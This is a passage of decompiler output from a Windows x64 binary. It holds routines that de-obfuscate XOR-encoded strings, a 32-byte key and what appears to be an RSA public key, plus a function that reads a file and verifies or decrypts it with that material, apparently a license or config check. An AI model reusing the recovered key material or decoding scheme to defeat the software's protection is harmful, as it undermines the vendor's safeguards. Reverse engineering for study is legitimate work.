    byte_1400DC2C1 = (v5 - 1) ^ 0x72;
    byte_1400DC2C2 = (v5 - 2) ^ 0x6F;
    byte_1400DC2C3 = (v5 - 3) ^ 0x64;
    byte_1400DC2C4 = (v5 - 4) ^ 0x75;
    byte_1400DC2C5 = (v5 - 5) ^ 0x63;
    byte_1400DC2C6 = (v5 - 6) ^ 0x74;
    byte_1400DC2C7 = (v5 - 7) ^ 0x5F;
    byte_1400DC2C8 = (v5 - 8) ^ 0x69;
    byte_1400DC2C9 = (v5 - 9) ^ 0x6E;
    byte_1400DC2CA = (v5 - 10) ^ 0x66;
    byte_1400DC2CB = (v5 - 11) ^ 0x6F;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xCui64 )
  {
    sub_140004790(Src, 0xCui64, 0i64);
    v5 = byte_1400DC2B9;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 12i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 12) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC2C0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xC );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC2B9: using guessed type char byte_1400DC2B9;
// 1400DC2BC: using guessed type int dword_1400DC2BC;
// 1400DC2C1: using guessed type char byte_1400DC2C1;
// 1400DC2C2: using guessed type char byte_1400DC2C2;
// 1400DC2C3: using guessed type char byte_1400DC2C3;
// 1400DC2C4: using guessed type char byte_1400DC2C4;
// 1400DC2C5: using guessed type char byte_1400DC2C5;
// 1400DC2C6: using guessed type char byte_1400DC2C6;
// 1400DC2C7: using guessed type char byte_1400DC2C7;
// 1400DC2C8: using guessed type char byte_1400DC2C8;
// 1400DC2C9: using guessed type char byte_1400DC2C9;
// 1400DC2CA: using guessed type char byte_1400DC2CA;
// 1400DC2CB: using guessed type char byte_1400DC2CB;

//----- (0000000140082CB0) ----------------------------------------------------
_QWORD *__fastcall sub_140082CB0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC2D0;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC2D0 & 1 )
  {
    v5 = byte_1400DC2CC;
  }
  else
  {
    v4 = 69069 * dword_1400DC254 + 1234567;
    v1 = dword_1400DC2D0 | 1;
    dword_1400DC254 = v4;
    dword_1400DC2D0 |= 1u;
    dword_1400DC24C = HIWORD(dword_1400DC24C) + 36969 * (unsigned __int16)dword_1400DC24C;
    LOBYTE(v4) = (BYTE2(dword_1400DC258) + 80 * dword_1400DC258) ^ v4;
    dword_1400DC258 = HIWORD(dword_1400DC258) + 18000 * (unsigned __int16)dword_1400DC258;
    v5 = (((unsigned int)dword_1400DC250 >> 13) ^ 32 * dword_1400DC250 ^ dword_1400DC250) + v4;
    dword_1400DC250 ^= ((unsigned int)dword_1400DC250 >> 13) ^ 32 * (dword_1400DC250 ^ (dword_1400DC250 << 12));
    byte_1400DC2CC = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC2D0 = v1 | 2;
    byte_1400DC2D8[0] = v5 ^ 0x74;
    byte_1400DC2D9 = (v5 - 1) ^ 0x68;
    byte_1400DC2DA = (v5 - 2) ^ 0x72;
    byte_1400DC2DB = (v5 - 3) ^ 0x6F;
    byte_1400DC2DC = (v5 - 4) ^ 0x77;
    byte_1400DC2DD = (v5 - 5) ^ 0x5F;
    byte_1400DC2DE = (v5 - 6) ^ 0x65;
    byte_1400DC2DF = (v5 - 7) ^ 0x78;
    byte_1400DC2E0 = (v5 - 8) ^ 0x63;
    byte_1400DC2E1 = (v5 - 9) ^ 0x65;
    byte_1400DC2E2 = (v5 - 10) ^ 0x70;
    byte_1400DC2E3 = (v5 - 11) ^ 0x74;
    byte_1400DC2E4 = (v5 - 12) ^ 0x69;
    byte_1400DC2E5 = (v5 - 13) ^ 0x6F;
    byte_1400DC2E6 = (v5 - 14) ^ 0x6E;
    byte_1400DC2E7 = (v5 - 15) ^ 0x73;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x10ui64 && (sub_140004790(Src, 0x10ui64, 0i64), v5 = byte_1400DC2CC, v3[3] < 0x10ui64) )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 16i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 16) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC2D8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x10 );
  return v3;
}
// 1400DC24C: using guessed type int dword_1400DC24C;
// 1400DC250: using guessed type int dword_1400DC250;
// 1400DC254: using guessed type int dword_1400DC254;
// 1400DC258: using guessed type int dword_1400DC258;
// 1400DC2CC: using guessed type char byte_1400DC2CC;
// 1400DC2D0: using guessed type int dword_1400DC2D0;
// 1400DC2D9: using guessed type char byte_1400DC2D9;
// 1400DC2DA: using guessed type char byte_1400DC2DA;
// 1400DC2DB: using guessed type char byte_1400DC2DB;
// 1400DC2DC: using guessed type char byte_1400DC2DC;
// 1400DC2DD: using guessed type char byte_1400DC2DD;
// 1400DC2DE: using guessed type char byte_1400DC2DE;
// 1400DC2DF: using guessed type char byte_1400DC2DF;
// 1400DC2E0: using guessed type char byte_1400DC2E0;
// 1400DC2E1: using guessed type char byte_1400DC2E1;
// 1400DC2E2: using guessed type char byte_1400DC2E2;
// 1400DC2E3: using guessed type char byte_1400DC2E3;
// 1400DC2E4: using guessed type char byte_1400DC2E4;
// 1400DC2E5: using guessed type char byte_1400DC2E5;
// 1400DC2E6: using guessed type char byte_1400DC2E6;
// 1400DC2E7: using guessed type char byte_1400DC2E7;

//----- (00000001400836B0) ----------------------------------------------------
__int64 __fastcall sub_1400836B0(__int64 a1)
{
  return *(unsigned __int8 *)(a1 + 56);
}

//----- (00000001400836C0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400836C0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  unsigned __int64 v3; // rdx
  unsigned __int64 v4; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v6; // rdx

  v2 = a2;
  v3 = ((unsigned __int64)(a1[2]
                         - *a1
                         + ((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
     + ((signed __int64)(a1[2]
                       - *a1
                       + ((unsigned __int128)((signed __int64)(a1[2] - *a1) * (signed __int128)-8608480567731124087i64) >> 64)) >> 6);
  if ( 153722867280912930i64 - (v3 >> 1) >= v3 )
  {
    v6 = (v3 >> 1) + v3;
    if ( v6 < v2 )
      v6 = v2;
    result = v6;
  }
  else
  {
    v4 = 0i64;
    if ( v2 > 0 )
      v4 = v2;
    result = v4;
  }
  return result;
}

//----- (0000000140083720) ----------------------------------------------------
signed __int64 __fastcall sub_140083720(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r15
  __int64 *v3; // rsi
  _QWORD *v4; // rdi
  _QWORD *v5; // r14
  __int64 v6; // rbx
  unsigned __int64 v7; // r12
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0x222222222222222i64 || (v4 = operator new(120 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_140081CE0((_QWORD *)*v3, (_QWORD *)v3[1], v4);
  v5 = (_QWORD *)v3[1];
  v6 = *v3;
  v7 = ((unsigned __int64)(v3[1]
                         - *v3
                         + ((unsigned __int128)((v3[1] - *v3) * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
     + ((signed __int64)(v3[1]
                       - *v3
                       + ((unsigned __int128)((v3[1] - *v3) * (signed __int128)-8608480567731124087i64) >> 64)) >> 6);
  if ( *v3 )
  {
    for ( ; (_QWORD *)v6 != v5; v6 += 120i64 )
      sub_14000BD90(v6);
    operator delete((void *)*v3);
  }
  v3[2] = (__int64)&v4[15 * v2];
  result = (signed __int64)&v4[15 * v7];
  v3[1] = result;
  *v3 = (__int64)v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140083830) ----------------------------------------------------
__int64 __fastcall sub_140083830(__int64 *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  __int64 *v3; // rbx
  __int64 v4; // rcx
  __int64 v5; // r8
  signed __int128 v6; // ax
  unsigned __int64 v7; // rdx
  unsigned __int64 v8; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = v3[2] - v4;
  v6 = v5 * (signed __int128)-8608480567731124087i64;
  if ( ((unsigned __int64)(v5 + *((_QWORD *)&v6 + 1)) >> 63) + ((v5 + *((_QWORD *)&v6 + 1)) >> 6) < v2 )
  {
    v7 = ((unsigned __int64)(v4
                           - *v3
                           + ((unsigned __int128)((v4 - *v3) * (signed __int128)-8608480567731124087i64) >> 64)) >> 63)
       + ((signed __int64)(v4 - *v3 + ((unsigned __int128)((v4 - *v3) * (signed __int128)-8608480567731124087i64) >> 64)) >> 6);
    if ( 153722867280912930i64 - v7 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v8 = sub_1400836C0(v3, v2 + v7);
    *(_QWORD *)&v6 = sub_140083720(v3, v8);
  }
  return v6;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400838D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400838D0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  a2[3] = 15i64;
  v2 = a2;
  a2[2] = 0i64;
  *(_BYTE *)a2 = 0;
  sub_140004DF0(a2, (_QWORD *)(a1 + 24), 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v2;
}

//----- (00000001400839E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400839E0(void *Dst, __int64 a2)
{
  __int64 v2; // rsi
  _QWORD *v3; // r15
  _QWORD *v4; // rax
  unsigned __int64 v5; // rbx
  void *v6; // rax
  void *v7; // rdi
  const void **v8; // rax
  const void *v9; // rdi
  void *v10; // rax
  size_t *v11; // r14
  void **v12; // rsi
  void **v13; // rbx
  void **v14; // rdi
  void **v15; // rax
  size_t *v16; // rax
  size_t *v17; // rax
  size_t *v18; // rax
  const void **v19; // rax
  const void *v20; // rdi
  void *v21; // rax
  char v22; // al
  void *v23; // rcx
  void *v24; // rdx
  void *v25; // rdx
  char v27; // [rsp+28h] [rbp-B0h]
  rsize_t Size; // [rsp+30h] [rbp-A8h]
  void *Memory; // [rsp+38h] [rbp-A0h]
  char v30; // [rsp+40h] [rbp-98h]
  rsize_t DstSize; // [rsp+48h] [rbp-90h]
  void *v32; // [rsp+50h] [rbp-88h]
  void *v33; // [rsp+58h] [rbp-80h]
  void *Dsta; // [rsp+60h] [rbp-78h]
  void *Src; // [rsp+68h] [rbp-70h]
  __int64 v36; // [rsp+70h] [rbp-68h]
  __int64 v37; // [rsp+78h] [rbp-60h]
  void *v38; // [rsp+80h] [rbp-58h]
  __int64 v39; // [rsp+90h] [rbp-48h]
  unsigned __int64 v40; // [rsp+98h] [rbp-40h]
  void *v41; // [rsp+A0h] [rbp-38h]
  __int64 v42; // [rsp+B0h] [rbp-28h]
  unsigned __int64 v43; // [rsp+B8h] [rbp-20h]
  void *v44; // [rsp+C0h] [rbp-18h]
  __int64 v45; // [rsp+D0h] [rbp-8h]
  unsigned __int64 v46; // [rsp+D8h] [rbp+0h]
  void *v47; // [rsp+E0h] [rbp+8h]
  __int64 v48; // [rsp+F0h] [rbp+18h]
  unsigned __int64 v49; // [rsp+F8h] [rbp+20h]
  void *v50; // [rsp+100h] [rbp+28h]
  __int64 v51; // [rsp+110h] [rbp+38h]
  unsigned __int64 v52; // [rsp+118h] [rbp+40h]
  void *v53; // [rsp+120h] [rbp+48h]
  __int64 v54; // [rsp+130h] [rbp+58h]
  unsigned __int64 v55; // [rsp+138h] [rbp+60h]
  void *v56; // [rsp+140h] [rbp+68h]
  __int64 v57; // [rsp+150h] [rbp+78h]
  unsigned __int64 v58; // [rsp+158h] [rbp+80h]
  void *v59; // [rsp+160h] [rbp+88h]
  __int64 v60; // [rsp+170h] [rbp+98h]
  unsigned __int64 v61; // [rsp+178h] [rbp+A0h]
  void *v62; // [rsp+180h] [rbp+A8h]
  __int64 v63; // [rsp+190h] [rbp+B8h]
  unsigned __int64 v64; // [rsp+198h] [rbp+C0h]
  void *v65; // [rsp+1A0h] [rbp+C8h]
  __int64 v66; // [rsp+1B0h] [rbp+D8h]
  unsigned __int64 v67; // [rsp+1B8h] [rbp+E0h]

  Dsta = (void *)-2i64;
  v2 = a2;
  v3 = Dst;
  v33 = Dst;
  std::basic_istream<char,std::char_traits<char>>::seekg(a2, 0i64, 2i64);
  v4 = (_QWORD *)std::basic_istream<char,std::char_traits<char>>::tellg(v2, &v38);
  v5 = *v4 + v4[1];
  std::basic_istream<char,std::char_traits<char>>::seekg(v2, 0i64, 0i64);
  v6 = operator new(v5);
  v7 = v6;
  if ( v6 )
    memset(v6, 0, v5);
  else
    v7 = 0i64;
  std::basic_istream<char,std::char_traits<char>>::read(v2, v7, v5);
  v37 = 15i64;
  v36 = 0i64;
  LOBYTE(Dsta) = 0;
  sub_140004F20(&Dsta, v7, v5);
  memset(v7, 0, v5);
  operator delete[](v7);
  v33 = (void *)15;
  v37 = 0i64;
  LOBYTE(Src) = 0;
  v8 = (const void **)sub_140083EB0(&v38);
  v9 = v8;
  if ( (unsigned __int64)v8[3] >= 0x10 )
    v9 = *v8;
  DstSize = 32i64;
  v10 = sub_14003A000(0x20ui64);
  v32 = v10;
  if ( v9 && v10 )
  {
    memcpy_s(v10, DstSize, v9, 0x20ui64);
  }
  else if ( DstSize )
  {
    memset(v10, 0, DstSize);
  }
  if ( v40 >= 0x10 )
    operator delete(v38);
  v40 = 15i64;
  v39 = 0i64;
  LOBYTE(v38) = 0;
  v11 = sub_140085DF0(&v65);
  v12 = sub_1400856E0(&v59);
  v13 = sub_140084FD0(&v53);
  v14 = sub_1400848C0(&v47);
  v15 = sub_1400841B0(&v44);
  v16 = sub_14001DE70(&v62, (size_t *)v15, (size_t *)v14);
  v17 = sub_14001DE70(&v50, v16, (size_t *)v13);
  v18 = sub_14001DE70(&v56, v17, (size_t *)v12);
  v19 = (const void **)sub_14001DE70(&v41, v18, v11);
  v20 = v19;
  if ( (unsigned __int64)v19[3] >= 0x10 )
    v20 = *v19;
  Size = 548i64;
  v21 = sub_14003A000(0x224ui64);
  Memory = v21;
  if ( v20 && v21 )
  {
    memcpy_s(v21, Size, v20, 0x224ui64);
  }
  else if ( Size )
  {
    memset(v21, 0, Size);
  }
  if ( v43 >= 0x10 )
    operator delete(v41);
  v43 = 15i64;
  v42 = 0i64;
  LOBYTE(v41) = 0;
  if ( v58 >= 0x10 )
    operator delete(v56);
  v58 = 15i64;
  v57 = 0i64;
  LOBYTE(v56) = 0;
  if ( v52 >= 0x10 )
    operator delete(v50);
  v52 = 15i64;
  v51 = 0i64;
  LOBYTE(v50) = 0;
  if ( v64 >= 0x10 )
    operator delete(v62);
  v64 = 15i64;
  v63 = 0i64;
  LOBYTE(v62) = 0;
  if ( v46 >= 0x10 )
    operator delete(v44);
  v46 = 15i64;
  v45 = 0i64;
  LOBYTE(v44) = 0;
  if ( v49 >= 0x10 )
    operator delete(v47);
  v49 = 15i64;
  v48 = 0i64;
  LOBYTE(v47) = 0;
  if ( v55 >= 0x10 )
    operator delete(v53);
  v55 = 15i64;
  v54 = 0i64;
  LOBYTE(v53) = 0;
  if ( v61 >= 0x10 )
    operator delete(v59);
  v61 = 15i64;
  v60 = 0i64;
  LOBYTE(v59) = 0;
  if ( v67 >= 0x10 )
    operator delete(v65);
  v67 = 15i64;
  v66 = 0i64;
  LOBYTE(v65) = 0;
  v22 = sub_1400897C0((char *)&Dsta, (__int64)&v30, (__int64)&v27, &Src);
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( v22 )
  {
    v23 = v33;
    if ( (unsigned __int64)v33 >= 0x10 )
    {
      *v3 = Src;
      Src = 0i64;
    }
    else if ( v37 != -1 )
    {
      memmove(v3, &Src, v37 + 1);
      v23 = v33;
    }
    v3[2] = v37;
    v3[3] = v23;
    v33 = (void *)15;
    v37 = 0i64;
    LOBYTE(Src) = 0;
  }
  v24 = Memory;
  memset(Memory, 0, Size);
  free(v24);
  v25 = v32;
  memset(v32, 0, DstSize);
  free(v25);
  if ( (unsigned __int64)v33 >= 0x10 )
    operator delete(Src);
  LOBYTE(Src) = 0;
  v37 = 0i64;
  v33 = (void *)15;
  return v3;
}
// 1400A1438: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::tellg(_QWORD, _QWORD);
// 1400A1440: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::seekg(_QWORD, _QWORD, _QWORD);
// 1400A1510: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::read(_QWORD, _QWORD, _QWORD);

//----- (0000000140083EB0) ----------------------------------------------------
_QWORD *__fastcall sub_140083EB0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC384;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DC384 & 1 )
  {
    v5 = byte_1400DC380;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC384 | 1;
    dword_1400DC378 = v4;
    dword_1400DC384 |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC380 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC384 = v1 | 2;
    byte_1400DC388[0] = v5 ^ 0x19;
    byte_1400DC389 = (v5 - 1) ^ 0x3D;
    byte_1400DC38A = (v5 - 2) ^ 3;
    byte_1400DC38B = (v5 - 3) ^ 0x16;
    byte_1400DC38C = (v5 - 4) ^ 0x82;
    byte_1400DC38D = (v5 - 5) ^ 0x16;
    byte_1400DC38E = (v5 - 6) ^ 0xB1;
    byte_1400DC38F = (v5 - 7) ^ 0x9A;
    byte_1400DC390 = (v5 - 8) ^ 0xB4;
    byte_1400DC391 = (v5 - 9) ^ 0x52;
    byte_1400DC392 = (v5 - 10) ^ 0x66;
    byte_1400DC393 = (v5 - 11) ^ 0xE1;
    byte_1400DC394 = (v5 - 12) ^ 0x14;
    byte_1400DC395 = (v5 - 13) ^ 0x4F;
    byte_1400DC396 = (v5 - 14) ^ 0x6E;
    byte_1400DC397 = (v5 - 15) ^ 0x25;
    byte_1400DC398 = (v5 - 16) ^ 0x7D;
    byte_1400DC399 = (v5 - 17) ^ 0x15;
    byte_1400DC39A = (v5 - 18) ^ 0x20;
    byte_1400DC39B = (v5 - 19) ^ 0x86;
    byte_1400DC39C = (v5 - 20) ^ 0x4B;
    byte_1400DC39D = (v5 - 21) ^ 0xC0;
    byte_1400DC39E = (v5 - 22) ^ 0xB;
    byte_1400DC39F = (v5 - 23) ^ 0x8D;
    byte_1400DC3A0 = (v5 - 24) ^ 0x7C;
    byte_1400DC3A1 = (v5 - 25) ^ 0x9D;
    byte_1400DC3A2 = (v5 - 26) ^ 0x48;
    byte_1400DC3A3 = (v5 - 27) ^ 0xA5;
    byte_1400DC3A4 = (v5 - 28) ^ 0xC1;
    byte_1400DC3A5 = (v5 - 29) ^ 0x48;
    byte_1400DC3A6 = (v5 - 30) ^ 0xC;
    byte_1400DC3A7 = (v5 - 31) ^ 0x52;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x20ui64 )
  {
    sub_140004790(Src, 0x20ui64, 0i64);
    v5 = byte_1400DC380;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 32i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 32) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DC388[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x20 );
  return v3;
}
// 1400DC370: using guessed type int dword_1400DC370;
// 1400DC374: using guessed type int dword_1400DC374;
// 1400DC378: using guessed type int dword_1400DC378;
// 1400DC37C: using guessed type int dword_1400DC37C;
// 1400DC380: using guessed type char byte_1400DC380;
// 1400DC384: using guessed type int dword_1400DC384;
// 1400DC389: using guessed type char byte_1400DC389;
// 1400DC38A: using guessed type char byte_1400DC38A;
// 1400DC38B: using guessed type char byte_1400DC38B;
// 1400DC38C: using guessed type char byte_1400DC38C;
// 1400DC38D: using guessed type char byte_1400DC38D;
// 1400DC38E: using guessed type char byte_1400DC38E;
// 1400DC38F: using guessed type char byte_1400DC38F;
// 1400DC390: using guessed type char byte_1400DC390;
// 1400DC391: using guessed type char byte_1400DC391;
// 1400DC392: using guessed type char byte_1400DC392;
// 1400DC393: using guessed type char byte_1400DC393;
// 1400DC394: using guessed type char byte_1400DC394;
// 1400DC395: using guessed type char byte_1400DC395;
// 1400DC396: using guessed type char byte_1400DC396;
// 1400DC397: using guessed type char byte_1400DC397;
// 1400DC398: using guessed type char byte_1400DC398;
// 1400DC399: using guessed type char byte_1400DC399;
// 1400DC39A: using guessed type char byte_1400DC39A;
// 1400DC39B: using guessed type char byte_1400DC39B;
// 1400DC39C: using guessed type char byte_1400DC39C;
// 1400DC39D: using guessed type char byte_1400DC39D;
// 1400DC39E: using guessed type char byte_1400DC39E;
// 1400DC39F: using guessed type char byte_1400DC39F;
// 1400DC3A0: using guessed type char byte_1400DC3A0;
// 1400DC3A1: using guessed type char byte_1400DC3A1;
// 1400DC3A2: using guessed type char byte_1400DC3A2;
// 1400DC3A3: using guessed type char byte_1400DC3A3;
// 1400DC3A4: using guessed type char byte_1400DC3A4;
// 1400DC3A5: using guessed type char byte_1400DC3A5;
// 1400DC3A6: using guessed type char byte_1400DC3A6;
// 1400DC3A7: using guessed type char byte_1400DC3A7;

//----- (00000001400841B0) ----------------------------------------------------
void **__fastcall sub_1400841B0(void *Src)
{
  int v1; // er9
  unsigned int v2; // edi
  void **v3; // rbx
  int v4; // esi
  char v5; // si
  void *v6; // rcx
  bool v7; // cf
  void **v8; // rax
  __int64 v9; // rdx
  void **v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DC3AC;
  v2 = 0;
  v3 = (void **)Src;
  if ( dword_1400DC3AC & 1 )
  {
    v5 = byte_1400DC3A8;
  }
  else
  {
    v4 = 69069 * dword_1400DC378 + 1234567;
    v1 = dword_1400DC3AC | 1;
    dword_1400DC378 = v4;
    dword_1400DC3AC |= 1u;
    dword_1400DC370 = HIWORD(dword_1400DC370) + 36969 * (unsigned __int16)dword_1400DC370;
    LOBYTE(v4) = (BYTE2(dword_1400DC37C) + 80 * dword_1400DC37C) ^ v4;
    dword_1400DC37C = HIWORD(dword_1400DC37C) + 18000 * (unsigned __int16)dword_1400DC37C;
    v5 = (((unsigned int)dword_1400DC374 >> 13) ^ 32 * dword_1400DC374 ^ dword_1400DC374) + v4;
    dword_1400DC374 ^= ((unsigned int)dword_1400DC374 >> 13) ^ 32 * (dword_1400DC374 ^ (dword_1400DC374 << 12));
    byte_1400DC3A8 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DC3AC = v1 | 2;
    byte_1400DC3B0[0] = v5 ^ 0x30;
    byte_1400DC3B1 = (v5 - 1) ^ 0x82;
    byte_1400DC3B2 = (v5 - 2) ^ 2;
    byte_1400DC3B3 = (v5 - 3) ^ 0x20;
    byte_1400DC3B4 = (v5 - 4) ^ 0x30;
    byte_1400DC3B5 = (v5 - 5) ^ 0xD;
    byte_1400DC3B6 = (v5 - 6) ^ 6;
    byte_1400DC3B7 = (v5 - 7) ^ 9;
    byte_1400DC3B8 = (v5 - 8) ^ 0x2A;
    byte_1400DC3B9 = (v5 - 9) ^ 0x86;
    byte_1400DC3BA = (v5 - 10) ^ 0x48;
    byte_1400DC3BB = (v5 - 11) ^ 0x86;
    byte_1400DC3BC = (v5 - 12) ^ 0xF7;
    byte_1400DC3BD = (v5 - 13) ^ 0xD;
    byte_1400DC3BE = (v5 - 14) ^ 1;
    byte_1400DC3BF = (v5 - 15) ^ 1;
    byte_1400DC3C0 = (v5 - 16) ^ 1;
    byte_1400DC3C1 = (v5 - 17) ^ 5;
    byte_1400DC3C2 = v5 - 18;
    byte_1400DC3C3 = (v5 - 19) ^ 3;
    byte_1400DC3C4 = (v5 - 20) ^ 0x82;
    byte_1400DC3C5 = (v5 - 21) ^ 2;
    byte_1400DC3C6 = (v5 - 22) ^ 0xD;
    byte_1400DC3C7 = v5 - 23;
    byte_1400DC3C8 = (v5 - 24) ^ 0x30;
    byte_1400DC3C9 = (v5 - 25) ^ 0x82;
    byte_1400DC3CA = (v5 - 26) ^ 2;
    byte_1400DC3CB = (v5 - 27) ^ 8;
    byte_1400DC3CC = (v5 - 28) ^ 2;
    byte_1400DC3CD = (v5 - 29) ^ 0x82;
    byte_1400DC3CE = (v5 - 30) ^ 2;
    byte_1400DC3CF = (v5 - 31) ^ 1;
    byte_1400DC3D0 = v5 - 32;
    byte_1400DC3D1 = (v5 - 33) ^ 0x94;
    byte_1400DC3D2 = (v5 - 34) ^ 0x8B;
    byte_1400DC3D3 = (v5 - 35) ^ 0x44;
    byte_1400DC3D4 = (v5 - 36) ^ 0xE2;
    byte_1400DC3D5 = (v5 - 37) ^ 0x91;
    byte_1400DC3D6 = (v5 - 38) ^ 7;
    byte_1400DC3D7 = (v5 - 39) ^ 0x3C;
    byte_1400DC3D8 = (v5 - 40) ^ 4;
    byte_1400DC3D9 = (v5 - 41) ^ 0x38;
    byte_1400DC3DA = (v5 - 42) ^ 0x58;
    byte_1400DC3DB = (v5 - 43) ^ 0x63;
    byte_1400DC3DC = (v5 - 44) ^ 0xB7;
    byte_1400DC3DD = (v5 - 45) ^ 0xCF;
    byte_1400DC3DE = (v5 - 46) ^ 0xB6;
    byte_1400DC3DF = (v5 - 47) ^ 0xB9;
    byte_1400DC3E0 = (v5 - 48) ^ 0x45;
    byte_1400DC3E1 = (v5 - 49) ^ 9;
    byte_1400DC3E2 = (v5 - 50) ^ 0x1F;
    byte_1400DC3E3 = (v5 - 51) ^ 0x19;
    byte_1400DC3E4 = (v5 - 52) ^ 0x91;
    byte_1400DC3E5 = (v5 - 53) ^ 0xB3;
    byte_1400DC3E6 = (v5 - 54) ^ 0x74;
    byte_1400DC3E7 = (v5 - 55) ^ 0xC9;
    byte_1400DC3E8 = (v5 - 56) ^ 0xA4;
    byte_1400DC3E9 = (v5 - 57) ^ 0x93;
    byte_1400DC3EA = (v5 - 58) ^ 0x87;
    byte_1400DC3EB = (v5 - 59) ^ 0xE1;
    byte_1400DC3EC = (v5 - 60) ^ 0x78;
    byte_1400DC3ED = (v5 - 61) ^ 0xFD;
    byte_1400DC3EE = (v5 - 62) ^ 0xC5;
    byte_1400DC3EF = (v5 - 63) ^ 0x22;
    byte_1400DC3F0 = ~(v5 - 64);
    byte_1400DC3F1 = (v5 - 65) ^ 0x34;
    byte_1400DC3F2 = (v5 - 66) ^ 0xE1;
    byte_1400DC3F3 = (v5 - 67) ^ 0x47;
    byte_1400DC3F4 = (v5 - 68) ^ 0x10;
    byte_1400DC3F5 = (v5 - 69) ^ 0xC3;
    byte_1400DC3F6 = (v5 - 70) ^ 0x6B;
